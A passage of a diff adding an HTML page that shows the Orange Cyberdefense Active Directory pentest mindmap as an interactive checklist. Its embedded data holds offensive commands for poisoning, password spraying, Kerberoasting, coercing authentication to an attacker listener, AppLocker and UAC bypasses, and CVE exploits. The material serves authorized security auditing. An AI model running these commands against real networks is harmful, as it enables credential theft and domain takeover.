@@ -1,0 +1,781 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>ADmap — Active Directory audit tracker</title>
+  <style>
+:root {
+  --bg: #0f1419;
+  --panel: #1a222c;
+  --panel-2: #212c38;
+  --border: #2d3a48;
+  --text: #e6edf3;
+  --muted: #8b98a5;
+  --accent: #4aa3ff;
+  --ok: #3fb950;
+  --ko: #f85149;
+  --code-bg: #0b0f14;
+  --spine: #3a4a5a;
+}
+* { box-sizing: border-box; }
+html, body { height: 100%; }
+body {
+  margin: 0;
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  font-size: 14px;
+  display: flex; flex-direction: column;
+}
+
+.topbar {
+  position: sticky; top: 0; z-index: 10;
+  display: flex; flex-wrap: wrap; gap: 12px 16px;
+  justify-content: space-between; align-items: center;
+  padding: 9px 16px;
+  background: linear-gradient(var(--panel), var(--panel-2));
+  border-bottom: 1px solid var(--border);
+  flex: 0 0 auto;
+}
+.brand { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+.titlewrap { display: flex; flex-direction: column; gap: 1px; }
+h1 {
+  margin: 0; font-size: 17px; font-weight: 700; letter-spacing: .2px;
+  background: linear-gradient(90deg, var(--text), var(--accent));
+  -webkit-background-clip: text; background-clip: text; color: transparent;
+}
+.tagline { color: var(--muted); font-size: 11px; letter-spacing: .3px; }
+.summary {
+  color: var(--muted); font-size: 12px; white-space: nowrap;
+  padding: 3px 9px; border: 1px solid var(--border); border-radius: 999px;
+  background: var(--code-bg);
+}
+.actions { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+/* zoom controls joined into one segmented group */
+.zoomgrp { display: inline-flex; }
+.zoomgrp .btn { border-radius: 0; border-left-width: 0; }
+.zoomgrp .btn:first-child { border-radius: 6px 0 0 6px; border-left-width: 1px; }
+.zoomgrp .btn:last-child { border-radius: 0 6px 6px 0; }
+.search {
+  background: var(--code-bg); border: 1px solid var(--border);
+  color: var(--text); border-radius: 6px; padding: 6px 10px; font-size: 13px; width: 210px;
+}
+.btn {
+  background: var(--panel-2); color: var(--text);
+  border: 1px solid var(--border); border-radius: 6px;
+  padding: 6px 11px; font-size: 13px; cursor: pointer;
+}
+.btn:hover { border-color: var(--accent); }
+.btn-danger:hover { border-color: var(--ko); color: var(--ko); }
+
+/* --- Keyboard focus: a clear target on every interactive element --- */
+:focus-visible {
+  outline: 2px solid var(--accent);
+  outline-offset: 2px;
+  border-radius: 6px;
+}
+.board:focus-visible { outline-offset: -2px; }
+
+/* skip link: off-screen until focused, then anchored top-left */
+.skip-link {
+  position: fixed; top: 8px; left: 8px; z-index: 30;
+  background: var(--panel-2); color: var(--text);
+  border: 1px solid var(--accent); border-radius: 6px;
+  padding: 6px 11px; font-size: 13px; text-decoration: none;
+  transform: translateY(-150%); transition: transform .15s ease;
+}
+.skip-link:focus { transform: translateY(0); }
+
+/* --- Board: zoom/pan container --- */
+.board {
+  flex: 1 1 auto;
+  position: relative;
+  overflow: hidden;            /* the plane is moved via transform */
+  cursor: grab;
+  touch-action: none;
+  background:
+    radial-gradient(circle at 1px 1px, rgba(255,255,255,.035) 1px, transparent 0) 0 0 / 28px 28px;
+}
+.board.grabbing { cursor: grabbing; }
+
+/* the transformed plane holding the columns */
+#plane {
+  position: absolute; top: 0; left: 0;
+  transform-origin: 0 0;
+  will-change: transform;
+  display: flex; gap: 22px; align-items: flex-start;
+  padding: 16px;
+}
+.column { display: flex; flex-direction: column; gap: 16px; flex: 0 0 auto; }
+
+/* --- Boxes (grow rightward as the tree expands) --- */
+.box {
+  --accent: #4aa3ff;
+  border: 1px solid var(--border);
+  border-left: 5px solid var(--accent);
+  border-radius: 10px;
+  background: var(--panel);
+  width: max-content;
+  max-width: none;
+}
+.box-head {
+  display: flex; align-items: center; gap: 8px;
+  padding: 10px 12px;
+  background: var(--panel-2);
+  border-radius: 9px 9px 0 0;
+  cursor: pointer; user-select: none;
+  min-width: 240px;
+}
+.box-head:hover { filter: brightness(1.08); }
+.box-dot { width: 10px; height: 10px; border-radius: 50%; background: var(--accent); flex: 0 0 10px; }
+.box-title { flex: 1; font-weight: 600; font-size: 14px; white-space: nowrap; }
+.box-count { font-size: 11.5px; color: var(--muted); white-space: nowrap; }
+.box-count .ok { color: var(--ok); }
+.box-count .ko { color: var(--ko); }
+.box-body { padding: 10px 12px 14px; display: flex; flex-direction: column; gap: 8px; }
+.box.collapsed .box-body { display: none; }
+/* connector tint derived from the box color */
+.box { --wire: color-mix(in srgb, var(--accent) 45%, #56687e); }
+
+/* --- Mindmap tree: self on the left, children on the right --- */
+.node { display: flex; flex-direction: row; align-items: center; }
+.board.grabbing .node, .board.grabbing .box { user-select: none; }
+
+.node-row {
+  display: inline-flex; align-items: center; gap: 6px;
+  padding: 4px 10px; margin: 3px 0;
+  white-space: nowrap; cursor: pointer; position: relative;
+  border-radius: 10px;
+  transition: background .12s, box-shadow .12s, border-color .12s;
+}
+/* branches = rounded pills */
+.node.has-kids > .node-row {
+  background: #22303f;
+  border: 1px solid var(--wire);
+  font-weight: 600;
+  box-shadow: 0 1px 2px rgba(0,0,0,.3);
+}
+.node.has-kids > .node-row:hover { background: #2a3b4d; }
+/* leaves = command sitting on a line */
+.node:not(.has-kids) > .node-row {
+  border-bottom: 2px solid var(--wire);
+  border-radius: 0; padding: 3px 10px 5px;
+}
+.node:not(.has-kids) > .node-row:hover { background: rgba(255,255,255,.05); }
+
+.node.has-kids[data-status="ok"] > .node-row { border-color: var(--ok); box-shadow: 0 0 0 1px var(--ok); }
+.node.has-kids[data-status="ko"] > .node-row { border-color: var(--ko); box-shadow: 0 0 0 1px var(--ko); }
+.node:not(.has-kids)[data-status="ok"] > .node-row { border-bottom-color: var(--ok); }
+.node:not(.has-kids)[data-status="ko"] > .node-row { border-bottom-color: var(--ko); }
+
+/* children + connectors (bracket + junction circle) */
+.node-children {
+  display: flex; flex-direction: column; justify-content: center; gap: 2px;
+  margin-left: 28px; position: relative;
+}
+.node-children::before {            /* vertical spine: first to last child */
+  content: ""; position: absolute; left: 0;
+  top: var(--first, 15px); height: var(--spine, calc(100% - 30px));
+  border-left: 2px solid var(--wire);
+}
+.node-children::after {             /* junction circle, at the parent level */
+  content: ""; position: absolute; left: -5px; top: var(--mid, 50%); transform: translateY(-50%);
+  width: 9px; height: 9px; border-radius: 50%;
+  background: var(--panel); border: 2px solid var(--wire);
+}
+.node.collapsed > .node-children { display: none; }
+.node.has-kids > .node-row::after { /* parent -> circle line */
+  content: ""; position: absolute; left: 100%; top: 50%;
+  width: 28px; border-top: 2px solid var(--wire);
+}
+.node.collapsed > .node-row::after { display: none; }
+.node-children > .node { position: relative; }
+.node-children > .node > .node-row { margin-left: 24px; }
+.node-children > .node::before {    /* horizontal tick to the child */
+  content: ""; position: absolute; left: 0; top: var(--rc, 50%);
+  width: 24px; border-top: 2px solid var(--wire);
+}
+
+.caret {
+  flex: 0 0 11px; width: 11px;
+  color: var(--accent); font-size: 9px; cursor: pointer;
+  text-align: center; transition: transform .15s ease;
+}
+.caret.leaf { visibility: hidden; width: 0; flex-basis: 0; margin: 0; }
+.node.collapsed > .node-row > .caret { transform: rotate(-90deg); }
+
+/* status chip (cycles — / ✓ / ✗) */
+.chip {
+  flex: 0 0 auto;
+  width: 18px; height: 18px;
+  border: 1px solid var(--border); border-radius: 50%;
+  background: #0f1620; color: var(--muted);
+  font-size: 10px; font-weight: 800; cursor: pointer; padding: 0; line-height: 1;
+  transition: transform .1s;
+}
+.chip:hover { transform: scale(1.18); }
+.chip.ok { background: rgba(63,185,80,.22); color: var(--ok); border-color: var(--ok); }
+.chip.ko { background: rgba(248,81,73,.22); color: var(--ko); border-color: var(--ko); }
+
+.node-content { display: inline-flex; align-items: center; gap: 6px; }
+.node-label { color: var(--text); }
+.node[data-status="ko"] > .node-row .node-label { color: var(--muted); text-decoration: line-through; }
+.node-cmd {
+  font-family: "Cascadia Code", Consolas, Menlo, monospace;
+  font-size: 12px; color: #9fe0b0; white-space: pre;
+}
+/* Variables ($VAR) highlighted so they stand out from the command. */
+.cmd-var {
+  color: #ffcc66; font-weight: 700;
+  background: rgba(255, 204, 102, 0.12);
+  border-radius: 3px; padding: 0 2px;
+}
+.copy-btn {
+  border: 1px solid var(--border); background: var(--panel-2);
+  color: var(--muted); border-radius: 4px;
+  width: 20px; height: 19px; font-size: 11px; cursor: pointer; padding: 0;
+}
+.copy-btn:hover { color: var(--accent); border-color: var(--accent); }
+.copy-btn.copied { color: var(--ok); border-color: var(--ok); }
+
+.note-btn {
+  flex: 0 0 auto;
+  border: 1px solid var(--border); background: var(--panel-2);
+  color: var(--muted); border-radius: 4px;
+  width: 20px; height: 19px; font-size: 11px; cursor: pointer; padding: 0;
+}
+.note-btn:hover { color: var(--accent); border-color: var(--accent); }
+.note-btn.has-note { color: var(--accent); border-color: var(--accent); background: rgba(74,163,255,.14); }
+/* --- Note modal --- */
+.modal-overlay {
+  position: fixed; inset: 0; z-index: 40;
+  background: rgba(0, 0, 0, .55);
+  display: flex; align-items: center; justify-content: center; padding: 16px;
+}
+.modal {
+  width: min(560px, 100%);
+  background: var(--panel); border: 1px solid var(--border);
+  border-radius: 12px; box-shadow: 0 16px 50px rgba(0, 0, 0, .5);
+  padding: 16px; display: flex; flex-direction: column; gap: 10px;
+}
+.modal-head { font-size: 15px; font-weight: 700; }
+.modal-sub {
+  font-size: 12px; color: var(--muted);
+  font-family: "Cascadia Code", Consolas, Menlo, monospace;
+  background: var(--code-bg); border: 1px solid var(--border);
+  border-radius: 6px; padding: 6px 8px;
+  white-space: pre-wrap; word-break: break-word; max-height: 84px; overflow: auto;
+}
+.modal-textarea {
+  width: 100%; min-height: 130px; resize: vertical;
+  background: var(--code-bg); color: var(--text);
+  border: 1px solid var(--border); border-radius: 8px;
+  padding: 10px; font-size: 13px; font-family: inherit; line-height: 1.5;
+}
+.modal-actions { display: flex; align-items: center; gap: 8px; }
+.modal-spacer { flex: 1; }
+.btn-primary { border-color: var(--accent); color: var(--accent); }
+.btn-primary:hover { background: rgba(74, 163, 255, .14); }
+
+.outcome {
+  font-size: 11px; color: #e3b341;
+  background: rgba(227,179,65,.12);
+  border: 1px solid rgba(227,179,65,.35);
+  border-radius: 4px; padding: 0 5px; white-space: nowrap;
+}
+
+.credit {
+  flex: 0 0 auto;
+  display: flex; align-items: center; justify-content: space-between; gap: 12px;
+  padding: 5px 16px; background: transparent;
+  border-top: 1px solid var(--border);
+}
+.credit-text {
+  font-size: 10.5px; line-height: 1.4;
+  color: color-mix(in srgb, var(--muted) 70%, transparent);
+}
+.credit-text a { color: inherit; text-decoration: underline; }
+.credit-text a:hover { color: var(--accent); }
+
+.toast {
+  position: fixed; bottom: 18px; left: 50%; transform: translateX(-50%);
+  background: var(--panel-2); border: 1px solid var(--border); color: var(--text);
+  padding: 9px 16px; border-radius: 8px; font-size: 13px;
+  box-shadow: 0 6px 20px rgba(0,0,0,.4); z-index: 20;
+}
+
+  </style>
+</head>
+<body>
+  <a class="skip-link" href="#board">Skip to the map</a>
+
+  <header class="topbar">
+    <div class="brand">
+      <div class="titlewrap">
+        <h1 id="map-title">ADmap</h1>
+        <span class="tagline">Active Directory audit tracker</span>
+      </div>
+    </div>
+    <div class="actions">
+      <input id="search" class="search" type="search" placeholder="Filter (technique / command)…" autocomplete="off">
+      <div class="zoomgrp">
+        <button id="zoom-out" class="btn" type="button" title="Zoom out">−</button>
+        <button id="zoom-in" class="btn" type="button" title="Zoom in">+</button>
+        <button id="zoom-reset" class="btn" type="button" title="Recenter">◎</button>
+      </div>
+      <button id="expand-all" class="btn" type="button">Expand all</button>
+      <button id="collapse-all" class="btn" type="button">Collapse all</button>
+      <button id="reset" class="btn btn-danger" type="button">Reset</button>
+    </div>
+  </header>
+
+  <main id="board" class="board" tabindex="-1"></main>
+
+  <footer class="credit">
+    <span id="summary" class="summary"></span>
+    <span class="credit-text">
+      <a href="https://github.com/Orange-Cyberdefense/ocd-mindmaps" target="_blank" rel="noopener">ocd-mindmaps</a>
+      by Mayfly (@M4yFly) &amp; contributors — GPL-3.0
+    </span>
+  </footer>
+
+  <div id="toast" class="toast" hidden></div>
+  <script>
+"use strict";
+
+const MINDMAP = {"title":"Active Directory Mindmap — Orange Cyberdefense","legend":"Disposition de la mindmap AD d'Orange Cyberdefense rendue interactive (branches repliables, copie des commandes, suivi ✓/✗).","source":"Orange Cyberdefense — GPL-3.0 — https://github.com/Orange-Cyberdefense/ocd-mindmaps","grid":{"cols":7,"rows":3},"nodes":[{"id":"no_creds","label":"No Credentials","color":"#D0CEE2","children":[{"id":"no_creds-611","label":"Scan network","children":[{"id":"no_creds-612","label":"","cmd":"nxc smb $IP_RANGE"},{"id":"no_creds-613","label":"","cmd":"nmap -sP -p $TARGET"},{"id":"no_creds-614","label":"","cmd":"nmap -Pn -sV --top-ports 50 --open $TARGET"},{"id":"no_creds-615","label":"","cmd":"nmap -Pn --script smb-vuln* -p139,445 $TARGET"},{"id":"no_creds-616","label":"","cmd":"nmap -Pn -sC -sV -oA $OUTPUT $TARGET"},{"id":"no_creds-617","label":"","cmd":"nmap -Pn -sC -sV -p- -oA $OUTPUT $TARGET"},{"id":"no_creds-618","label":"","cmd":"nmap -sU -sC -sV -oA $OUTPUT $TARGET"}],"outcome":"Vulnerable host"},{"id":"no_creds-619","label":"Find DC IP","children":[{"id":"no_creds-620","label":"","cmd":"nmcli dev show $INTERFACE"},{"id":"no_creds-621","label":"","cmd":"nslookup -type=SRV _ldap._tcp.dc._msdcs.$DOMAIN"},{"id":"no_creds-622","label":"","cmd":"nmap -p 88 --open $IP_RANGE"}]},{"id":"no_creds-623","label":"Zone transfer","children":[{"id":"no_creds-624","label":"","cmd":"dig axfr $DOMAIN @$DC_NAME"}]},{"id":"no_creds-625","label":"Anonymous & Guest access on SMB shares","children":[{"id":"no_creds-626","label":"","cmd":"nxc smb $IP_RANGE -u '' -p ''"},{"id":"no_creds-627","label":"","cmd":"nxc smb $IP_RANGE -u 'a' -p ''"},{"id":"no_creds-628","label":"","cmd":"enum4linux-ng.py -a -u '' -p '' $TARGET"},{"id":"no_creds-629","label":"","cmd":"smbclient -U '%' -L //$TARGET"}]},{"id":"no_creds-630","label":"Enumerate LDAP","children":[{"id":"no_creds-631","label":"","cmd":"nmap -n -sV --script 'ldap*' and not brute -p 389 $DC_IP"},{"id":"no_creds-632","label":"","cmd":"ldapsearch -x -H $DC_IP -s base"}],"outcome":"Username"},{"id":"no_creds-633","label":"Enumerate Users","children":[{"id":"no_creds-634","label":"","cmd":"nxc smb $DC_IP --users"},{"id":"no_creds-635","label":"","cmd":"nxc smb $DC_IP --rid-brute 10000 # bruteforcing RID"},{"id":"no_creds-636","label":"","cmd":"net rpc group members 'Domain Users' -W '$DOMAIN -l $TARGET -U '%'"}],"outcome":"Username"},{"id":"no_creds-637","label":"Bruteforce users","children":[{"id":"no_creds-638","label":"","cmd":"kerbrute userenum -d $DOMAIN $USERLIST"},{"id":"no_creds-639","label":"","cmd":"nmap -p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm= '$DOMAIN',userdb=$USERFILE\" $DC_IP"}],"outcome":"Username"},{"id":"no_creds-640","label":"Poisoning","children":[{"id":"no_creds-641","label":"LLMNR / NBTNS / MDNS","children":[{"id":"no_creds-642","label":"","cmd":"responder -l $INTERFACE"}]},{"id":"no_creds-643","label":"⚠️ DHCPv6 (IPv6 prefered to IPv4)","children":[{"id":"no_creds-644","label":"","cmd":"mitm6 -d $DOMAIN"},{"id":"no_creds-645","label":"","cmd":"bettercap"}]},{"id":"no_creds-646","label":"⚠️ ARP Poisoning","children":[{"id":"no_creds-647","label":"","cmd":"bettercap"},{"id":"no_creds-648","label":"","children":[{"id":"no_creds-649","label":"","cmd":"Pcredz -i $INTERFACE -v","outcome":"Hash found ASREQ"}],"cmd":"asreqroast"}]}],"outcome":"poisoning SMB || poisoning LDAP || poisoning HTTP"},{"id":"no_creds-650","label":"Coerce","children":[{"id":"no_creds-651","label":"Unauthenticated PetitPotam (CVE-2022-26925)","children":[{"id":"no_creds-652","label":"","cmd":"petitpotam.py -d $DOMAIN $LISTENER $TARGET"}]}],"outcome":"Coerce SMB"},{"id":"no_creds-653","label":"PXE","children":[{"id":"no_creds-654","label":"no password","children":[{"id":"no_creds-655","label":"","cmd":"pxethief.py 1"},{"id":"no_creds-656","label":"","cmd":"pxethief.py 2 $TARGET"}],"outcome":"Credentials (NAA account)"},{"id":"no_creds-657","label":"password protected","children":[{"id":"no_creds-658","label":"","cmd":"tftp -i $TARGET GET \"\\xxx\\boot.var\""},{"id":"no_creds-659","label":"","cmd":"pxethief.py 5 '\\xxx\\boot.var'"}],"outcome":"PXE Hash"}]},{"id":"no_creds-660","label":"TimeRoasting","children":[{"id":"no_creds-661","label":"","cmd":"timeroast.py $DC_IP -o $OUTPUT"}],"outcome":"timeroast hash"}],"row":0,"col":0},{"id":"valid_user","label":"Valid user (no password)","color":"#66B2FF","children":[{"id":"valid_user-817","label":"Password Spray","children":[{"id":"valid_user-818","label":"Get password policy  (you need creds,but you should get the policy  first to avoid locking accounts)","children":[{"id":"valid_user-819","label":"default policy","children":[{"id":"valid_user-820","label":"","cmd":"nxc smb $DC_IP -u '$USER' -p '$PASSWORD' --pass-pol"},{"id":"valid_user-821","label":"","cmd":"Get-ADDefaultDomainPasswordPolicy"},{"id":"valid_user-822","label":"","cmd":"ldeep ldap -u $USER -p $PASSWORD -d $DOMAIN -s ldap://$DC_IP domain_policy"}]},{"id":"valid_user-823","label":"Fined Policy (Privileged)","children":[{"id":"valid_user-824","label":"","cmd":"ldapsearch-ad.py --server $DC_IP -d $DOMAIN -u $USER -p $PASSWORD --type pass-pols"},{"id":"valid_user-825","label":"","cmd":"Get-ADFineGainedPasswordPolicy -filter *"},{"id":"valid_user-826","label":"","cmd":"ldeep ldap -u $USER -p $PASSWORD -d $DOMAIN -s ldap://$DC_IP pso # can also be runned with a low priv account but less information will be available"}]}]},{"id":"valid_user-827","label":"⚠️ user == password","children":[{"id":"valid_user-828","label":"","cmd":"nxc smb $DC_IP -u $USERFILE -p $PASSFILE --no-bruteforce --continue-on-success"},{"id":"valid_user-829","label":"","cmd":"sprayhound -U $USERFILE -d $DOMAIN -dc  $DC_IP   # add --lower to lowercase and --upper to uppercase. Add nothing to get only user=pass"}],"outcome":"Clear text Credentials"},{"id":"valid_user-830","label":"⚠️ usuals passwords  (SeasonYear!, Company123, ...)","children":[{"id":"valid_user-831","label":"","cmd":"nxc smb $DC_IP -u $USERFILE -p $PASSWORD --continue-on-success"},{"id":"valid_user-832","label":"","cmd":"sprayhound -U $USERFILE -p $PASSWORD -d $DOMAIN -dc  $DC_IP"},{"id":"valid_user-833","label":"","cmd":"kerbrute passwordspray -d $DOMAIN $USERFILE $PASSWORD"}],"outcome":"Clear text Credentials"}]},{"id":"valid_user-834","label":"ASREPRoast","children":[{"id":"valid_user-835","label":"List ASREPRoastable Users (need creds)","children":[{"id":"valid_user-836","label":"","cmd":"MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u"}]},{"id":"valid_user-837","label":"ASREP roasting","children":[{"id":"valid_user-838","label":"","cmd":"GetNPUsers.py $DOMAIN/ -usersfile $USERFILE -format hashcat -outputfile $OUTPUT"},{"id":"valid_user-839","label":"","cmd":"nxc ldap $DC_IP -u $USERFILE  -p '' --asreproast $OUTPUT"},{"id":"valid_user-840","label":"","cmd":"Rubeus.exe asreproast /format:hashcat"}],"outcome":"Hash found ASREP"},{"id":"valid_user-841","label":"Blind Kerberoasting","children":[{"id":"valid_user-842","label":"","cmd":"Rubeus.exe keberoast /domain:$DOMAIN /dc:$DC_IP /nopreauth: $USER /spns:$USERFILE"},{"id":"valid_user-843","label":"","cmd":"GetUserSPNs.py -no-preauth \"$USER\" -usersfile \"$USERFILE\" -dc-host \"$DC_IP\" \"$DOMAIN\"/"}],"outcome":"Hash found TGS"},{"id":"valid_user-844","label":"CVE-2022-33679","children":[{"id":"valid_user-845","label":"","cmd":"CVE-2022-33679.py $DOMAIN/$USER $TARGET"}],"outcome":"Lat move PTT"}]}],"row":0,"col":1},{"id":"authenticated","label":"Valid Credentials (cleartext creds, nt hash, kerberos ticket)","color":"#00ff00","children":[{"id":"authenticated-208","label":"Classic Enumeration (users, shares, ACL, delegation, ...)","children":[{"id":"authenticated-209","label":"Find all users","children":[{"id":"authenticated-210","label":"","cmd":"GetADUsers.py -all -dc-ip $DC_IP $DOMAIN/$USER"},{"id":"authenticated-211","label":"","cmd":"nxc smb $DC_IP -u '$USER' -p '$PASSWORD' --users"}],"outcome":"Username"},{"id":"authenticated-212","label":"Enumerate SMB share","children":[{"id":"authenticated-213","label":"","cmd":"nxc smb $IP_RANGE -u '$USER' -p '$PASSWORD' -M spider_plus"},{"id":"authenticated-214","label":"","cmd":"nxc smb $IP_RANGE -u '$USER' -p '$PASSWORD' --shares [--get-file \\\\$FILENAME $FILENAME]"},{"id":"authenticated-215","label":"","cmd":"manspider $IP_RANGE -c passw -e $FILE_EXTENSIONS -d $DOMAIN -u $USER -p $PASSWORD"}],"outcome":"Scroll shares"},{"id":"authenticated-216","label":"Bloodhound Legacy","children":[{"id":"authenticated-217","label":"","cmd":"bloodhound-python -d $DOMAIN -u $USER -p $PASSWORD -gc $DC_IP -c all"},{"id":"authenticated-218","label":"","cmd":"rusthound -d $DOMAIN -u '$USER@$DOMAIN' -p '$PASSWORD' -o $OUTPUT -z"},{"id":"authenticated-219","label":"","cmd":"import-module sharphound.ps1;invoke-bloodhound -collectionmethod all -domain $DOMAIN"},{"id":"authenticated-220","label":"","cmd":"sharphound.exe -c all -d $DOMAIN"}],"outcome":"ACL || Delegation || Username"},{"id":"authenticated-221","label":"Bloodhound CE","children":[{"id":"authenticated-222","label":"","cmd":"bloodhound-python -d $DOMAIN -u $USER -p $PASSWORD -gc $DC_IP -c all"},{"id":"authenticated-223","label":"","cmd":"rusthound-ce -d $DOMAIN -u '$USER@$DOMAIN' -p '$PASSWORD' -o $OUTPUT -z --ldap-filter=(objectGuid=*)"},{"id":"authenticated-224","label":"","cmd":"sharphound.exe -c all -d $DOMAIN"},{"id":"authenticated-225","label":"","cmd":"SOAPHound.exe -c c:\\temp\\cache.txt --bhdump -o c:\\temp\\bloodhound-output --autosplit --threshold 900"}],"outcome":"ACL || Delegation || Username"},{"id":"authenticated-226","label":"Enumerate Ldap","children":[{"id":"authenticated-227","label":"","cmd":"ldeep ldap -u $USERS -p '$PASSWORD' -d $DOMAIN -s ldap://$DC_IP all $OUTPUT"},{"id":"authenticated-228","label":"","cmd":"ldapdomaindump.py -u $USER -p $PASSWORD -o $OUTPUT ldap://$DC_IP:389"},{"id":"authenticated-229","label":"","cmd":"ldapsearch-ad.py -l $DC_IP -d $DOMAIN -u $USER -p '$PASSWORD' -o $OUTPUT -t all"}],"outcome":"ACL || Delegation || Username"},{"id":"authenticated-230","label":"Enumerate DNS","children":[{"id":"authenticated-231","label":"","cmd":"adidnsdump -u $DOMAIN\\\\$USER -p \"$PASSWORD\" --print-zones $DC_IP"}],"outcome":"New targets (low hanging fruit)"}]},{"id":"authenticated-232","label":"Enumerate ADCS","children":[{"id":"authenticated-233","label":"","cmd":"certify.exe find"},{"id":"authenticated-234","label":"","cmd":"certipy find -u $USER@$DOMAIN -p '$PASSWORD' -dc-ip $DC_IP"}],"outcome":"ADCS Exploitation"},{"id":"authenticated-235","label":"Enumerate SCCM","children":[{"id":"authenticated-236","label":"","cmd":"sccmhunter.py find -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -debug"},{"id":"authenticated-237","label":"","cmd":"ldeep ldap -u $USER -p $PASSWORD -d $DOMAIN -s ldap://$DC_IP sccm"},{"id":"authenticated-238","label":"","cmd":"SharpSCCM.exe local site-info"}],"outcome":"SCCM Exploitation"},{"id":"authenticated-239","label":"Scan Auto","children":[{"id":"authenticated-240","label":"from BH result","children":[{"id":"authenticated-241","label":"","cmd":"AD-miner -c -cf Report -u $NEO4J_USERNAME -p $NEO4J_PASSWORD"}]},{"id":"authenticated-242","label":"","cmd":"PingCastle.exe --healthcheck --server $DOMAIN"},{"id":"authenticated-243","label":"","cmd":"Import-Module .\\adPEAS.ps1; Invoke-adPEAS -Domain '$DOMAIN' -Server '$DC_NAME'"}]},{"id":"authenticated-244","label":"Kerberoasting","children":[{"id":"authenticated-245","label":"","cmd":"MATCH (u:User) WHERE u.hasspn=true AND u.enabled = true AND NOT u.objectid ENDS WITH '-502' AND NOT COALESCE(u.gmsa, false) = true AND NOT COALESCE(u.msa, false) = true RETURN u"},{"id":"authenticated-246","label":"","cmd":"GetUserSPNs.py -request -dc-ip $DC_IP $DOMAIN/$USER:$PASSWORD"},{"id":"authenticated-247","label":"","cmd":"Rubeus.exe kerberoast"}],"outcome":"Hash TGS"},{"id":"authenticated-248","label":"Coerce","children":[{"id":"authenticated-249","label":"Drop file","children":[{"id":"authenticated-250","label":".lnk","children":[{"id":"authenticated-251","label":"","cmd":"nxc smb $DC_IP -u '$USER' -p '$PASSWORD' -M slinky -o NAME=$FILENAME SERVER=$LISTENER"}]},{"id":"authenticated-252","label":".scf","children":[{"id":"authenticated-253","label":"","cmd":"nxc smb $DC_IP -u '$USER' -p '$PASSWORD' -M sucffy -o NAME=$FILENAME SERVER=$LISTENER"}]},{"id":"authenticated-254","label":".url","children":[{"id":"authenticated-255","label":"","cmd":"[InternetShortcut]... IconFile=\\\\$LISTENER\\%USERNAME%.icon"}]},{"id":"authenticated-256","label":"Other files","children":[{"id":"authenticated-257","label":"","cmd":"ntlm_theft.py -g all -s $LISTENER -f test"}]}]},{"id":"authenticated-258","label":"Webdav","children":[{"id":"authenticated-259","label":"Enable webclient","children":[{"id":"authenticated-260","label":".searchConnector-ms","children":[{"id":"authenticated-261","label":"","cmd":"nxc smb $DC_IP -u '$USER' -p '$PASSWORD' -M drop-sc"}]}]},{"id":"authenticated-262","label":"add attack computer in dns","children":[{"id":"authenticated-263","label":"","cmd":"dnstool.py -u $DOMAIN\\$USER -p $PASSWORD --record attacker --action add --data $LISTENER $DC_IP"}]},{"id":"authenticated-264","label":"Launch coerce with \u003cattacker_hostname>@80/x as target","outcome":"HTTP Coerce"}]},{"id":"authenticated-265","label":"RPC call","children":[{"id":"authenticated-266","label":"","cmd":"printerbug.py $DOMAIN/$USER:$PASSWORD@$TARGET $LISTENER"},{"id":"authenticated-267","label":"","cmd":"petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $LISTNERER_IP $TARGET"},{"id":"authenticated-268","label":"","cmd":"coercer.py -d $DOMAIN -u $USER -p $PASSWORD -t $TARGET -l $LISTENER"}],"outcome":"SMB NTLM Coerce"},{"id":"authenticated-269","label":"Coerce kerberos","children":[{"id":"authenticated-270","label":"","children":[{"id":"authenticated-271","label":"","cmd":"petitpotam.py -u '$USER' -p '$PASSWORD' -d $DOMAIN '$SERVERNAME1UWh...' $TARGET"}],"cmd":"dnstool.py -u \"$DOMAIN\\$USER\" -p '$PASSWORD' -d \"$LISTENER\" --action add \"$TARGET\" -r \"$SERVERNAME1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\" --tcp"}],"outcome":"SMB Kerberos coerce"}]},{"id":"authenticated-272","label":"Intra ID Connect","children":[{"id":"authenticated-273","label":"Find MSOL","children":[{"id":"authenticated-274","label":"","cmd":"nxc ldap $DC_IP -u '$USER' -p '$PASSWORD' -M get-desc-users |grep -i MSOL"}]}]},{"id":"authenticated-275","label":"Can Connect to a computer","outcome":"Lateral move"},{"id":"authenticated-276","label":"Exploit","outcome":"know vulnerabilities"}],"row":0,"col":2},{"id":"low_access","label":"Low access (Privilege escalation)","color":"#D0CEE2","children":[{"id":"low_access-499","label":"Bypass Applocker","children":[{"id":"low_access-500","label":"Get-Applocker infos","children":[{"id":"low_access-501","label":"","cmd":"Get-ChildItem -Path HKLM:\\SOFTWARE\\Policies \\Microsoft\\Windows\\SrpV2\\Exe (dll/msi/...)"}]},{"id":"low_access-502","label":"files in writables paths","children":[{"id":"low_access-503","label":"C:\\Windows\\Temp"},{"id":"low_access-504","label":"C:\\Windows\\Tasks"}]},{"id":"low_access-505","label":"","cmd":"installutil.exe /logfile= /LogToConsole=false /U C:\\runme.exe"},{"id":"low_access-506","label":"","cmd":"mshta.exe my.hta"},{"id":"low_access-507","label":"","cmd":"MsBuild.exe pshell.xml"}],"outcome":"Low access (without applocker)"},{"id":"low_access-508","label":"UAC bypass","children":[{"id":"low_access-509","label":"","cmd":"Fodhelper.exe"},{"id":"low_access-510","label":"","cmd":"wsreset.exe"},{"id":"low_access-511","label":"","cmd":"msdt.exe"}],"outcome":"Admin"},{"id":"low_access-512","label":"Auto Enum","children":[{"id":"low_access-513","label":"","cmd":"winPEASany_ofs.exe"},{"id":"low_access-514","label":"","cmd":".\\PrivescCheck.ps1;  Invoke-PrivescCheck -Extended\""}],"outcome":"Admin"},{"id":"low_access-515","label":"Search files","children":[{"id":"low_access-516","label":"","cmd":"findstr /si 'pass' *.txt *.xml *.docx *.ini"}],"outcome":"User Account"},{"id":"low_access-517","label":"Exploit","children":[{"id":"low_access-518","label":"SMBGhost CVE-2020-0796"},{"id":"low_access-519","label":"CVE-2021-36934 (HiveNightmare/SeriousSAM)","children":[{"id":"low_access-520","label":"","cmd":"vssadmin list shadows"}]}],"outcome":"Admin"},{"id":"low_access-521","label":"Webdav","children":[{"id":"low_access-522","label":"open file 